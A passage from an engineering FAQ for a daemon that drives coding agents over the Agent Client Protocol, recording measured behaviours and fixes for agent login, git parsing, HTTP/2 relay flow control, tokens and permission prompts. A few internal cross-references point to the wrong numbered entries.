authenticate out-of-band"* and `grep -rn authenticate src/` finds nothing. That
works for `claude` and `kimi`, which read credentials off disk. After a completed
Google sign-in, `gemini --acp` still answered `session/new` and then failed the
first prompt with `API_KEY_INVALID` — a working login that the session never
selected.

**Consequence.** Any future agent support has to decide whether to drive
`authenticate` or to keep inheriting from disk and accept the smaller agent set.
Today the choice is made by omission.

### Q6.21 — Why does `resolveLoginBinary` exist separately from `resolveAgent`?

**Behaviour.** `claude-agent-acp` resolves a `claude` that is not on PATH. The
adapter depends on `@anthropic-ai/claude-agent-sdk`, which ships the binary
inside a platform-specific package (`…-sdk-linux-arm64/claude`) with no `bin`
entry and resolves it internally.

**Consequence.** The adapter can work perfectly while `claude` is absent, and a
remedy naming `claude` cannot run — which is exactly what happened to a
documented one.

**Handled by.** `resolveLoginBinary`, which reads `CLAUDE_CODE_EXECUTABLE` first.
That variable is preserved through `agentEnv`'s strip for the same reason: it is
the documented override for *which* build the adapter drives, and a login must
drive that one or it writes credentials the session never reads.

### Q6.22 — Why does an agent login need `script`?

**Behaviour.** A daemon's stdin is never a TTY, and both agents' login flows are
interactive terminal programs that will not prompt without a pty. The two
`script` implementations differ: util-linux takes a shell string after `-qec`,
BSD takes argv after the typescript file, and getting it wrong does not fail
loudly (the BSD form on Linux writes a file called `claude` and records nothing).
macOS `script` has no `-e`, so it does not propagate the child's exit status.
Under a pty with stdin piped, `claude auth login` prints the authorize URL
wrapped in an OSC 8 hyperlink (`ESC ] 8 ;; <url> BEL <url> ESC ] 8 ;; BEL`) and
waits on `Paste code here if prompted >` — so it needs the input box and **no
inbound port**, its `redirect_uri` being `platform.claude.com` rather than
localhost. `kimi login` is a device-code flow: it prints a URL and a user code
and then polls by itself, so its input box is never used.

**Consequence.** The output is a terminal recording either way, which a `<pre>`
cannot show raw. Stripping the OSC leaves the duplicated plain URL that follows
it, which is what the wizard offers as a link. A lone `\r` must become a newline
rather than being dropped: it means "redraw this line", and honouring it properly
needs a terminal emulator nobody is writing, while dropping it concatenates every
spinner frame into one line.

**Handled by.** `hostLoginArgs` allocates the pty; `sanitize` in `agentauth.ts`
strips the recording.

**Measured.** 2026-07-31, both flows under a pty with stdin piped.

### Q6.23 — Why is the login probe parsed from JSON rather than from an exit code?

**Behaviour.** `claude auth status` prints `{"loggedIn": false, …}` and exits
**1** when logged out, 0 when logged in — so the exit code does track the answer.
It is not what is read, because exit 1 would then be indistinguishable from a
crash, a missing binary, or a future version that fails for its own reasons. The
JSON says which.

**Consequence.** `available` only ever meant "the binary is on PATH", so a
logged-out agent reported `available: true` and the person found out at
`502 agent_auth_required`, after a worktree had already been made. `loggedIn` is
`boolean | null` for the same reason `Liveness` has three answers — kimi has no
non-interactive way to say, and rendering "cannot tell" as "logged out" would put
a login wizard in front of somebody whose agent works.

**Measured.** 2026-07-31.

### Q6.24 — Does a crashed daemon leave its agents running?

**Behaviour.** Yes, and this inverted back. While agents ran in containers,
`docker exec`'s stdin pipe died with the daemon that opened it, and EOF is what
both adapters treat as "connection over, exit" — so genuine orphans were rare. A
`detached` child survives its parent, so they are ordinary again.

**Handled by.** The reap path and the `os.uptime()` fence.

### Q6.25 — Why does `pkill -f "tsx scripts/daemon.ts"` match nothing?

**Behaviour.** The real command line is `…/tsx/dist/cli.mjs scripts/daemon.ts`.

**Consequence.** That pattern silently kills no daemon, and the next one refuses
to start on the database lock. Kill by pid.

### Q6.26 — Why does `claude` never ask for permission on the development machine?

**Behaviour.** `~/.claude/settings.json` there blanket-allows `Bash`, `Edit`,
`Write` and others, so the inner CLI decides for itself.

**Consequence.** The permission state machine is never exercised by that agent on
that machine. Test the permission path with `kimi`, or use an isolated
`CLAUDE_CONFIG_DIR`.

### Q6.27 — Why is the default port 7887 rather than 7777?

**Behaviour.** Port 7777 was already taken by another service on the development
machine, which restarted itself automatically.

**Consequence.** With 7777 as the default, the no-configuration path dialled
another service and failed as a puzzling protocol error rather than a refused
connection.

**Handled by.** Both `DEFAULT_PORT` in `scripts/daemon.ts` and the client's
`REEMOAT_URL` fallback are 7887.

### Q6.28 — Is the slow-consumer collapse path tested?

**Behaviour.** Not on the daemon side. The code is there — bounded queue →
`lagged{reason:"slow_consumer"}` → snapshot → close 4003 on a second collapse in
30s — but producing it needs real TCP backpressure.

**Consequence.** Only the eviction path (`reason:"evicted"`) is verified on the
daemon.

**Handled by.** `pnpm webcheck` covers the *client's* half: a 4003 close backs
off and does **not** mark the machine unreachable, because the daemon plainly
answered.

### Q6.29 — Can `@hono/node-server` be upgraded past 1.x?

**Behaviour.** `@hono/node-ws` peers on `@hono/node-server` ^1.x, not 2.x.

**Consequence.** Do not upgrade node-server past 1.x without checking.

### Q6.30 — Do git's two rename-reporting commands agree on field order?

**Behaviour.** No, they are opposite. `status --porcelain=v2` emits `<newPath>`
then `<origPath>`; `diff --raw -z` and `--numstat -z` emit `<srcPath>` then
`<dstPath>`.

**Consequence.** `changes.ts` uses both, so a shared "read two path tokens"
helper would invert every rename.

### Q6.31 — How many tokens does a porcelain-v2 `2` record span?

**Behaviour.** Two NUL-separated ones. Under `-z` the two pathnames are separated
by a NUL rather than by the tab of the non-`-z` form.

**Consequence.** Consume the extra token or every later record shifts by one.

### Q6.32 — What does `git diff --no-index` exiting 1 mean?

**Behaviour.** That the files differ — which is the *success* case, and it is the
path every newly created file takes. Its header also names the absolute path.

**Consequence.** A caller treating exit 1 as failure loses every created file.
The header is rewritten to repo-relative so the patch applies.

### Q6.33 — `--ignored=matching` or `--ignored=traditional`?

**Behaviour.** `matching`, never `traditional`. Measured in this repository, with
`-uall`, `traditional` yields **6408** records (every file under
`node_modules/`) against **2** for `matching`.

**Consequence.** The traditional form makes a change listing useless and
enormous.

### Q6.34 — Can one git call decide whether a directory is a repository?

**Behaviour.** No. `rev-parse --show-toplevel` dies in a bare repo, so the repo
probe needs two calls; combining them reports a usable bare repo as "not a repo".
And `--git-common-dir` returns a *relative* `.git` without
`--path-format=absolute`.

### Q6.35 — Does `-uall` descend into a nested repository?

**Behaviour.** No. git stops at any directory holding its own `.git` and emits
one `? dir/` record.

**Handled by.** Those records are flagged `collapsed`.

### Q6.36 — Does `yamux-js` have the flow control it advertises?

**Behaviour.** No. In its `session.ts` the receive window is replenished when
bytes *arrive* rather than when they are *read*: `stream.push(packet)`
immediately followed by `stream.updateRecvWindow(packet.length)`, with `push()`'s
return value discarded, `_read()` never granting credit, and the `recvBuf` that
`sendWindowUpdate` subtracts declared but never assigned — so the delta always
restores the full window.

**Consequence.** A slow consumer never throttles the sender and the receive
buffer grows without bound. It looks perfect in dev. This is the exact shape of
bug the relay is most likely to acquire, which is why it is written down after
the library was rejected.

**Handled by.** The tunnel is HTTP/2 instead: `WINDOW_UPDATE` is granted on
consumption, in core. Verified both ways — a stalled h2 consumer parks the sender
at the window and it stays parked, which is what `pnpm relaycheck`'s flow-control
case exists to keep true.

### Q6.37 — Does running HTTP/2 over a WebSocket need a socket shim?

**Behaviour.** No. `http2.connect(url, { createConnection: () => duplex })` and
`server.emit("connection", duplex)` both take a plain `Duplex` — Node documents
`createConnection` as returning "any Duplex stream". Likewise
`http.request({createConnection: () => h2stream})` serializes an ordinary request
*and* raises `upgrade` on a 101, so nothing in the relay hand-writes HTTP.

**Consequence.** What the relay *does* hand-write is the replay of that 101 onto
the client socket — status line and `rawHeaders`, plus the `head` buffer — which
is precisely the part no framework is checking, and why inspection was not
enough.

**Handled by.** All three were measured against a daemon-shaped server before the
design was committed to, and `pnpm relaycheck`'s websocket case keeps the third
true: it opens a real `ws://` client through the relay, asserts the daemon's
unprompted first frame arrives and a client frame echoes back, and asserts the
upgrade cost exactly one stream and released it.

### Q6.38 — When can you read the port a server actually bound to?

**Behaviour.** Not synchronously. `server.address()` is `null` at every
synchronous point after `serve()` returns — on every host form, including a
literal IP.

**Consequence.** Started from outside the listening callback, `localAddress`
silently took its configured-value fallback every time: right by luck for a fixed
port, and wrong for `REEMOAT_PORT=0`, where the tunnel came up and then spliced
every stream to port 0.

**Handled by.** `RelayTunnel.start` is called from inside the listening callback,
not after `serve`. `port: 0` out of `localAddress` now means "could not tell" and
refuses to dial rather than dialling nowhere.

### Q6.39 — What is the real HTTP/2 bottleneck if only per-stream windows are raised?

**Behaviour.** The connection-level window, which defaults to 64 KiB and is
shared by every stream.

**Consequence.** Left there it is the real bottleneck no matter how large the
per-stream windows are, and a few stalled browsers would hold it all and slow the
healthy ones. Miss `setLocalWindowSize` on one side and throughput collapses in
that direction only, which is a miserable thing to diagnose.

**Handled by.** Both ends call `setLocalWindowSize`.

### Q6.40 — Why is the JWS hand-rolled when `jose` is in the lockfile?

**Behaviour.** `jose` arrives only as a transitive dependency of
`@agentclientprotocol/*`, and pnpm's strict layout means `src/` cannot resolve
it.

**Consequence.** The JWS in `token.ts` is hand-rolled on `node:crypto` for that
reason, not out of preference.

### Q6.41 — What happens when a token is rejected because a clock is wrong?

**Behaviour.** It is reported in both directions, deliberately. A token rejected
within 5× the leeway is far more likely to be a wrong clock than an attack, so
the daemon logs it (via `onSuspectedClockSkew`, since nothing in `src/` prints)
*and* returns `detail: { skewMs, daemonTime, leewayMs }` in the 401. `/health`
carries `time` unauthenticated so a client with no token can still diff clocks.

**Consequence.** Silent skew is the classic failure here; none of this is
decoration.

### Q6.42 — Why does `pinned` have a `DEFAULT` and `owner_subject` not?

**Behaviour.** SQLite refuses `ADD COLUMN ... NOT NULL` outright without a
`DEFAULT`. `pinned` has `DEFAULT 0`, which is also the honest value, since
nothing written before the column existed was ever pinned. For an owner there is
no honest default, which is why that column is nullable instead.

**Consequence.** The two are not inconsistent; they are the same question
answered from the data.

### Q6.43 — Where does a new column on `sessions` belong?

**Behaviour.** In `migrate()`, not `schema.sql`. That file is re-applied on every
open and is all `CREATE ... IF NOT EXISTS`, which is idempotent for whole tables
and useless for a new column on an existing one.

**Consequence.** New *tables* need nothing.

**Handled by.** `migrate()` decides from `PRAGMA table_info`, not from
`user_version`, so it cannot be wrong about what the file actually contains.

### Q6.44 — What does a malformed `Authorization` header do?

**Behaviour.** It is now a failure, not a fallthrough. It used to fall through to
`?token=` whenever the header did not start with exactly `Bearer `, so
`authorization: bearer x` — lowercase, which some clients send — took the
no-header path.

**Consequence.** A client sending a lowercase scheme was told its token was
missing.

### Q6.45 — Why must `enroll` not swallow an abort while reading the body?

**Behaviour.** `fetch` resolves as soon as the headers arrive, so the timeout is
deliberately cleared *after* `response.json()`. A blanket `.catch(() => null)`
there defeated the whole arrangement: the abort never reached the handler that
reports a timeout, `response.ok` was still true for the 200 whose headers had
landed, and startup failed with `bad_response` — "the control plane sent
something malformed" — for a control plane that had simply stopped talking.

**Handled by.** Found by `pnpm authcheck`'s stalling-server case, which is why
that case exists.

### Q6.46 — What does redeeming an enrollment code do to a live tunnel?

**Behaviour.** It retires the machine's tunnel key. That is the point of it, and
it makes enrollment destructive to any live tunnel for that machine.

**Consequence.** A trap in a driver: `relaycheck` redeems against its own
`m_enroll` rather than `m_mine`, because doing it against the machine whose
tunnel later sections use revokes the credential underneath them.

### Q6.47 — Why can't `packages/web` be type-checked by the root config?

**Behaviour.** The root is NodeNext, which requires explicit `.js` on relative
imports; the web package is bundler-resolved and extensionless. A root-config
file that imports `packages/web/src` pulls those files into a program that
rejects them, and `exclude` does not help because exclusion only trims the
initial file set.

**Handled by.** `webcheck` lives in the package and has its own
`tsconfig.check.json` — the only place `@types/node` and the DOM lib coexist,
which the shipped `tsconfig.json` deliberately forbids.

### Q6.48 — Why does the project require Node >= 24?

**Behaviour.** `node:sqlite` needs `--experimental-sqlite` on Node 22.

**Handled by.** `engines` is `>=24`.

### Q6.49 — What stops two daemons sharing one database file?

**Behaviour.** The single-row `daemon` table, checked before restore.

**Consequence.** Without it each daemon would reap the other's agents.

### Q6.50 — What happens if the daemon's port is already taken?

**Behaviour.** It crashes with a raw `EADDRINUSE` stack rather than a clean
message.

**Consequence.** Pre-existing, not yet fixed.

### Q6.51 — Which environment variable authenticates codex?

**Behaviour.** `CODEX_API_KEY`, and **not** `OPENAI_API_KEY` — which is the
obvious name, the one every other OpenAI tool reads, and the wrong answer. The two
were told apart by which rejection the API returned for a deliberately bogus key,
2026-08-07 against the vendored `@openai/codex` 0.145.0 — the CLI the adapter
actually spawns, rather than the 0.146.1 on PATH — with an empty `CODEX_HOME`:
`CODEX_API_KEY` gives
`invalid_api_key` / "Incorrect API key", i.e. a key was sent and refused;
`OPENAI_API_KEY` gives "Missing bearer or basic authentication in header", i.e.
nothing was sent at all. Setting `preferred_auth_method = "apikey"` does not change
it.

**Consequence.** `AGENT_LOGIN.codex.envNames` is `["CODEX_API_KEY"]`, asserted in
`daemoncheck` *including* the negative — that `OPENAI_API_KEY` is not offered —
because the failure this prevents is a paste box that stores a token nothing reads
and a Settings screen that says "set". This is the field Q6.29's kimi contradiction
is about, answered the way that entry says it should be: by asking the binary.

### Q6.52 — Is a pasted `CODEX_API_KEY` enough to start a session?

**Behaviour.** No. Measured in the same run: with the key in the environment and no
`auth.json`, `codex-acp` refuses `session/new` with -32000 "Authentication
required". So the key reaches the model's API calls and does not satisfy the
adapter's own auth check.

**Consequence.** The paste box is the weaker of codex's two paths, as it is for
kimi, and the wizard (`codex login --device-auth`) is the one that works. It is not
a trap only because of an existing asymmetry: the login probe runs *with* the
pasted credential in its environment, `codex login status` still answers "Not
logged in", and a clean `false` is believed over a token we know we handed over.
Without that ordering the screen would say "signed in" and the first session would
answer `502 agent_auth_required` — the exact defect Q6.30 records for claude.

### Q6.53 — Which stream does a login status command answer on?

**Behaviour.** Not the same one for both agents. `claude auth status` prints JSON on
**stdout**; `codex login status` prints a sentence on **stderr** and writes nothing
to stdout at all. Both exit 1 when logged out and 0 when signed in.

**Consequence.** `LoginStatusProbe` carries a `stream` field, and this was learned
by getting it wrong: the first codex integration read stdout, saw an empty string,
and reported `status unknown` in `GET /agents` for an agent that was signed in and
worked perfectly — with no error, no log line and nothing to search for. A field
rather than "read stdout, fall back to stderr", because that fallback is a guess
that happens to be right and would start reading a warning line the day a CLI
printed one. The exit code is still not read, for Q6.30's reason.

### Q6.54 — How does codex ask the user a question?

**Behaviour.** Through `elicitation/create` — the same JSON-RPC method claude's
adapter uses and the one `AcpClient` already registers — gated on
`clientCapabilities.elicitation.form`, which it reads with exactly the same
expression. Measured 2026-08-07 end to end: `mode: "form"`, a `message`, and a
schema holding a titled single-select plus a free-text box. So the integration was
one literal in `AGENT_IDS`; no handler, no capability and no card changed.

**Consequence.** The names differ and nothing reads them, which is what made it
free. codex suffixes its free-text field `__other` where claude uses `_custom`, and
hangs a `_meta.codex` block naming the parent question off every property; `_meta`
is dropped at ingest and neither suffix is ever parsed. A client that had keyed on
either would render one agent's question and refuse the other's — so both
projections sit side by side as fixtures in `daemoncheck`.

The model-initiated question is nevertheless **off by default**, behind codex's own
`default_mode_request_user_input` feature flag, which `codex features list` marks
"under development". With it off the model says "the prompt tool is unavailable in
this mode" and asks in prose instead. `codex features enable
default_mode_request_user_input` turns it on and nothing in this daemon does —
flipping a vendor's development flag would be deciding on their behalf about a
feature they have not shipped. `tool_call_mcp_elicitation` *is* stable and on, so
MCP tool approvals arrive as elicitations with no flag at all.

### Q6.55 — What does a codex permission request look like?

**Behaviour.** The command is on `rawInput` (kimi's opposite — see Q6.26), there is
**no `title`**, and no `kind` survives to the snapshot. So
`title = toolCall.title ?? toolCall.toolCallId` falls through and the card is
handed `exec-b34af4d4-…` as its heading. Four options, and **two of them are
`kind: "allow_always"`**: "Allow for Session" beside an execpolicy amendment
("Allow Commands Starting With `curl -sS …`"), the first duplicate kind any agent
has sent. `rawInput.command` is double-quoted, because codex runs
`/bin/zsh -lc "<this>"` and puts the inner string there.

**Consequence.** Nothing needed changing, and that is the finding: two rules that
looked like belt-and-braces are what carry it. `permissionHeadline` infers the verb
from `command` when `kind` is null, and falls back to a generic object when there
is no target, so the card reads "Allow Codex to run this command?" and the uuid
never reaches a heading — asserted in `webcheck`, negatively as well as positively.
The quotes are drawn as sent: trimming them would be this client editing a command
somebody is about to approve.

### Q6.56 — Does codex have an equivalent of `CLAUDE_CODE_EXECUTABLE`?

**Behaviour.** Yes: `CODEX_PATH`, read by codex-acp's own `startAcpServer()` —
`const codexPath = process.env["CODEX_PATH"]`, falling back to the `@openai/codex`
copy it vendors. It names which `codex` binary *sessions* run, which is exactly
`CLAUDE_CODE_EXECUTABLE`'s job, and it survives `agentEnv`'s strip.

**Consequence.** The first version of this integration asserted the opposite, in a
comment and in a `daemoncheck` line reading "only claude names an executable
override" — so the driver would have defended the error against anyone correcting
it. The live failure it left: with `CODEX_PATH` set, sessions run one build while
the login wizard and the signed-in probe drive another, which is precisely the
"login that appears to work and changes nothing" that preferring the vendored copy
exists to prevent, re-entering through the override door. `resolveLoginBinary` now
reads `AGENT_LOGIN[agent].executableEnv` for every agent rather than under an
`agent === "claude"` test, and the assertion pins the pair **by name**, because the
count was the part that looked right. `CODEX_HOME` is a different variable — it
names the credentials, not the binary — and confusing the two sends somebody to
move their credentials to fix a missing CLI.

### Q6.57 — Why is a login status pattern `^[ \t]*` rather than `^\s*`?

**Behaviour.** Because `^\s*` under `/m` is quadratic and the input is unbounded
subprocess output. `^` matches at every line start and `\s*` consumes the whole
remaining run before backtracking; measured, 100k newlines takes **7.6s** against
0ms for `^[ \t]*`. `runProbe` allows `maxBuffer: 1 MiB`, and `readLoginAnswer` runs
both patterns.

**Consequence.** A synchronous stall of the event loop — every session, every
socket and `/health` — caused by output this daemon did not write, which is the
hazard `stall.ts` exists for and the reason an agent-chosen `pattern` is dropped at
elicitation ingest. Worth recording because the regex here is *ours*, so the
existing rule ("never run an agent-chosen regex") reads as though it does not
apply; what makes it apply is that the **subject** is attacker-adjacent even when
the pattern is not. `\s` is what makes a newline both the anchor and the fuel, so
the fix is to stop matching newlines with the quantifier, not to bound the input.

### Q6.58 — Where does codex put a command's output, and why was every Bash card empty?

**Behaviour.** Not in `tool_call_update.content`, which is where this daemon read
it. Measured against codex-acp 1.1.9: a finished command sends
`{sessionUpdate: "tool_call_update", status, rawOutput: {formatted_output,
exit_code}}` and **no content block at all** (`createCommandExecutionCompleteUpdate`,
`index.js:22826`, and `completeCommandExecutionEvent`, `:24113`). The streaming
copy is `_meta.terminal_output_delta`, and where a terminal is used the handle
arrives as a `type: "terminal"` block — which this daemon deliberately drops, a
live handle being no use to a reader.

So all three containers were ones nothing here read, and the symptom was total and
silent: every Bash card on a codex session drew the command, a tick, and nothing
else. "What did the test run say?" was unanswerable from the transcript.

**Decision.** `rawToolOutput` reads `formatted_output`, and the caller uses it
**only where the blocks carried nothing** — `toolOutput(...) ?? rawToolOutput(...)`.
That gate is what keeps one command from being reported twice on claude, which
sends the bytes as a content block *and* sets `rawOutput`.

**Why one key rather than a walk of the object.** `ToolCallUpdate.rawOutput` is
`unknown` in the schema — it is the tool's own result, whatever that tool is — so
anything beyond a named key is guessing at somebody else's shape. Measured,
claude's adapter never writes `formatted_output` (0 occurrences; its `rawOutput`
is the tool's content), so naming the key is also what keeps this from changing
anything there.

**Why the exit code is not turned into prose.** `status: "failed"` is already on
the update and is what the card draws. Writing `exit 1` as text would put a
sentence in the transcript that no tool printed.

**Not taken — the streaming half.** `_meta.terminal_output_delta`, and the
`clientCapabilities._meta["terminal_output"]` that both adapters read, would give
incremental output — and would change what *claude* sends, switching its Bash
results from a fenced content block to a terminal stream. That is a separate
measurement against a path the transcript renderer has never seen, so it is not
bundled with recovering the output that is already being dropped.

**Status.** Current

### Q6.100 — What is `session_info_update`, and why does codex send five of them a turn?

**Behaviour.** codex emits `session_info_update` about five times a turn, carrying a
thread status and a title the daemon already derives for itself. Nothing in
`onUpdate` has an arm for it, so it falls into `default:` and becomes an `other`
event.

**Consequence.** It is invisible rather than wrong: `TRANSCRIPT_SILENT` refuses to
draw an `other` row and `EventQueue` evicts that type first. What it does cost is
bytes in a log that is never truncated — the only cost, and named here rather than
left to be discovered by somebody reading a database.

**Handled by.** Nothing, deliberately. It is also one of the two types that
interleave with `text` inside a single turn, which is why `buildTail` flushes a
coalesced text run only for an event *outside* `TRANSCRIPT_SILENT` rather than on
every event — see Q3.100, where this is the second of the two real cases.

**Status.** Current

### Q6.101 — Does opening a tool card ever show less than the row above it?

**Behaviour.** Yes, and codex's web search is the case that forced the rule. That
call carries no content block, no locations and no children, so the chevron opened
to the 66 characters the row had already drawn in full — and drew *less* than the
title, since `rawInput.query` is codex's own truncated copy of the first of three
queries while `title` lists all three.

**Consequence.** Whenever a tool's arguments yield a command, `toolSummary` answers
that same string as both `summary` and `detail`, so a test of `detail !== null`
makes a card openable in order to show the line above it. A disclosure whose body
repeats its own row is worse than no disclosure.

**Handled by.** `opensToAnything` in `packages/web/src/ui/tail.ts`. What keeps the
useful case is that the row clips at `SUMMARY_CHARS` **in that file rather than in
CSS**, so "was anything cut off" is a question the code can answer — a
4000-character `Bash` command still opens while it runs, a short one does not. The
sibling rule is one line up: the row does not draw the headline when it **is** the
title, because codex names a `Bash` call after the command it runs and the row
printed those 82 characters twice.

**Measured.** 2026-08-13, over the whole log: 43 cards become 38 openable and 5
shut, and every one of the five had a body that repeated its own row.

**Status.** Current

### Q6.102 — Can an agent refine a tool call's arguments after it has sent them?

**Behaviour.** Yes. codex's web search sends the `tool_call` carrying
`{type: "webSearch", id, query: "", action: null}` — a placeholder object with four
keys, so `hasInput` is true — and the update that follows carries the same object
with the query actually in it. The same call carries **no content block at all**,
like codex's Bash (Q6.58), so the arguments are the whole card.

**Consequence.** `resolveTool` preferred *the call* whenever it had anything at all,
so the card drew `"query": ""` under a title reading `Web search: red mullet…`
(the query translated from the original) — the title being newest-wins one
line above and the arguments not.

**Handled by.** `resolveTool` takes newest-wins on the arguments as well as on the
title. Both directions have to hold at once: claude sends `{}` on the call, where a
plain `??` picks the empty object and no command ever appears (Q6.10), and codex
sends a four-key placeholder, where preferring the call keeps the empty query.

**Measured.** 2026-08-13 against codex's web search.

**Status.** Current

### Q6.103 — What does `ClientRequest.destroy()` do to a response that has already started?

**Behaviour.** Nothing the client can see. `destroy()` with no argument emits no
`'error'` on the request, so the relay's own `upstream.on("error")` — the only thing
that closes the browser-facing `res` — never ran once `res.writeHead` had happened.
`pipe` forwards `end` and never a premature close, so nothing else covered it either.

**Consequence.** `UPSTREAM_IDLE_TIMEOUT_MS` fired correctly and reached nobody. A
browser held an open response whose `content-length` promised bytes nothing was ever
going to send, and waited for ever. The same hole swallowed **every** mid-body
upstream death, a tunnel drop included — so `isReplayable`, which would happily
replay the `GET`, never got a failure to react to. This is the whole distance between
"the transcript failed, retry" and a spinner with no end, and it is what
`loading N earlier events…` actually was.

The comment beside the bound asserted the opposite in so many words — *"Destroying
the request lands on the `error` handler below"* — which is true before `writeHead`
and false after it, and is why this survived reading.

**Measured.** 2026-08-14, `node:24-slim` (the relay's own runtime) and Node 26.3.0,
against a daemon that answers with a `content-length`, writes 64 KiB, then goes
silent. With the bound simulated at 2 s: `upstream.setTimeout FIRED at +2017ms`, and
the client `STILL HANGING at +12004ms with 65536 bytes`. Destroying with an error
instead: `aborted` at +1508 ms. Killing the CONNECT stream mid-body — a tunnel drop —
hung identically before and aborted at +808 ms after.

**Handled by.** `upstream.destroy(new Error(...))` on the bound, so it lands on the
handler that was always meant to catch it, plus `upRes.on("error")` and an
`upRes.on("close")` that checks `complete` — the undeprecated test, and the wider
one, since it also catches an upstream closing *short of its own `content-length`*
without erroring, which would otherwise hand a client a truncated transcript as a
whole one. Both paths carry it; the upgrade path's `upstream.on("response")` leaked a
raw client socket the same way. `relaycheck`'s `an upstream that dies mid-body` case
pins it and was seen red first.

**Status.** Current

### Q6.104 — Does a relayed response larger than one h2 stream window arrive?

**Behaviour.** Not reliably. The sender stops at exactly one `STREAM_WINDOW_BYTES`,
or one window plus one half-window, and never resumes.

**Measured.** 2026-08-14, against a real session over the relay. Byte-deterministic:
`limit=510` → 261 752 bytes, complete; `limit=520` → `content-length` 262 095 and
**261 934 received**, wedged; `limit=2000` → `content-length` 437 390 and **393 006
received**, wedged. 19 of 20 attempts wedged; the survivor completed in 0.28 s. TTFB
was 0.13 s every time — headers and the first window arrive at once, then silence,
which is why it draws as loading rather than as an error.

`261934 = 262144 − 210` and `393006 = 393216 − 210`, the 210 being the daemon's own
HTTP/1.1 response headers riding the same stream.

**Why those two numbers and no others.** nghttp2 emits `WINDOW_UPDATE` only at half
the window (`nghttp2_should_send_window_update`: `recv_window_size >= local_window_size / 2`),
so a peer that stops getting credit stops at `W` or at `W + W/2` and nowhere else.

**Mechanism, read out of Node's own source.** Only the *stream* window is withheld —
`Http2Session::OnDataChunkReceived` credits the **connection** window unconditionally
on arrival and withholds the stream window unless `stream->is_reading()`, accruing
into `inbound_consumed_data_while_paused_`. That is the fingerprint, and it matches:
one stream dies while the session and every other stream on the tunnel stay healthy.
`Http2Stream::ReadStart` is the only place that ever drains the accrued counter, and
it is reachable **only** through `_read()` — `internal/http2/core.js` wires
`this.on('pause', streamOnPause)` and wires no `'resume'` at all. Meanwhile Node's
HTTP/1.1 client drives exactly that pause/resume on the stream it was handed as a
socket: `_http_common.js` does `if (!stream.push(b)) readStop(this.socket)` and
`_http_incoming.js` does `socket.resume()`. So every window past the first depends on
that chain completing, and on a **healthy** transfer it runs about **20 `readStop`s
per `readStart`** — it completes only because some later event happens to re-enter
`_read()`.

**Rejected.** Replacing the adapter. `http.request({createConnection: () => stream})`
is the sanctioned suspect — Node's own CONNECT example reads a tunnel with
`req.on('data')` rather than handing the stream to the HTTP client, and no
nodejs/node issue exists for this pattern stalling. But wrapping the stream in a
`Duplex`, so the parser pauses an ordinary stream instead of the h2 one, was built and
measured and **does not help**: 2 MiB through a rate-limited reader gave
`readStart=46 readStop=62` before and `readStart=46 readStop=61` after. The asymmetry
survives the rewrite, so shipping it would be a speculative change to the one thing
Q6.37 records as measured-then-committed.

**Not reproducible off the fleet**, which is why it is bounded rather than fixed. The
relay's exact topology — WebSocket duplex transport, both `setLocalWindowSize` calls,
CONNECT spliced to loopback, `upRes.pipe(res)` — was driven ~150 times on Node 24 and
26 under instant readers, backpressuring readers, a 200 KiB/s browser, tunnel latency,
a throttled uplink, 8-way concurrency, a parked stream and 175 aborted mid-body
requests, and every transfer completed. A second independent reproduction added 140
more across nine timing configurations with the same result.

**Handled by.** Making a transcript page fit in one window rather than chasing the
race: `EVENTS_PAGE_BYTES` 2 MiB → 768 KiB and `STREAM_WINDOW_BYTES` 256 KiB → 1 MiB,
now a coupled pair documented in both directions. The page is bounded *before* gzip
and gzip cannot meaningfully expand it, so the compressed bytes always fit. It became
reachable at all when `EVENTS_PAGE_LIMIT` rose 500 → 5000: at 500 the same session
answered 261 485 bytes, 659 below the old ceiling, and the defect had been there the
whole time with nothing large enough to reach it.

**Known limitation.** This closes the route, not the defect.
`GET /sessions/:id/files` and `/uploads/:uploadId` stream arbitrary bytes and are
excluded from compression by `compressible`, so a download past 1 MiB can still wedge
— now ending as a visible failure and a retry rather than a spinner, per Q6.103.
⚠ `nodejs/node#64623` raises the default stream window 65535 → 4 MiB (merged
2026-08-04, unreleased). It moves the threshold and not the mechanism: a later "it
stopped happening" is not evidence this was fixed.

**Status.** Known limitation

## Open questions and deliberate non-goals

### Q7.1 — Was keeping full session history on disk an optimisation?

**Position.** It is built, and the entry is kept as the shape of the work rather
than deleted, because it named the three pieces exactly and all three were
needed: a replay cap in `attach` (`ATTACH_REPLAY_MAX`), a new `lagged.reason`
telling a client to page `GET /sessions/:id/events` instead (`backlog`), and a
client that does the paging (`store.ts`'s `loadAll`).

**Why not yet.** What the original entry got wrong was the order: it read as an
optimisation to be done when convenient, and it was the only thing standing
between the product and a daemon that destroyed conversations.

**What it would take.** Nothing further — see *A session's log is never
truncated* under Invariants.

**Status.** Known limitation (of the earlier framing, not of the code).

### Q7.2 — Should kimi's questions be turned into elicitations?

**Position.** kimi asks through `session/request_permission` instead, so it
reaches a person perfectly well and always did. The gap is cosmetic rather than
functional.

**Why not yet.** What the permission shape cannot carry is what the elicitation
shape does: free text beside the choices, several questions in one ask, and
per-option descriptions. `PermissionOptionKind` is a closed four-value union with
no channel for any of it. Closing that means either a daemon-hosted MCP
`ask_user` tool passed through `session/new`'s `mcpServers`, or waiting for kimi
to emit elicitations itself. Neither is worth doing on the evidence so far.

**What it would take.** Measuring how often kimi actually wants a free-text
answer, rather than assuming it does.

**Status.** Deliberate non-goal.

### Q7.3 — Do in-flight elicitations survive a daemon restart?

**Position.** No. A parked question holds a live `resolve` closure, so the
session comes back `interrupted` and `pendingElicitations` is empty.

**Why not yet.** The closure cannot be serialized.

**What it would take.** Nothing is planned; what exists is that the loss is
*visible* — an id this daemon really did mint answers `409 elicitation_expired`
rather than 404, which works because the counter and salt are on the row, and
sharing them with permissions bought that with no second column.

**Status.** Known limitation.

### Q7.4 — Do in-flight permissions survive a restart?

**Position.** No, for the same reason: a pending approval holds a live `resolve`
closure that cannot be serialized. The session comes back `interrupted`,
`pendingPermissions` is empty, and an id it really did mint answers
`409 permission_expired` rather than claiming it never existed.

**Why not yet.** That visibility is asserted rather than described: `daemoncheck`
restores a row carrying `askSeq: 3` and a known salt with no agent anywhere — the
only state in which an id is recognisably ours and no longer answerable, since
`resolved` is in memory and the counter is on the row — and pins all four
answers, including that a sequence never reached and another daemon's salt are
both 404 rather than the 409 becoming a blanket reply.

**What it would take.** Synthesizing a `permission_resolved` on restore would
tidy the transcript, but needs a new `AnswerResolvedBy` member and a scan of the
restored log to find which ids were outstanding.

**Status.** Known limitation.

### Q7.5 — How do a subagent's steps get drawn under the call that started them?

**Position.** Built. `ui/tail.ts` holds the whole rule set as pure functions,
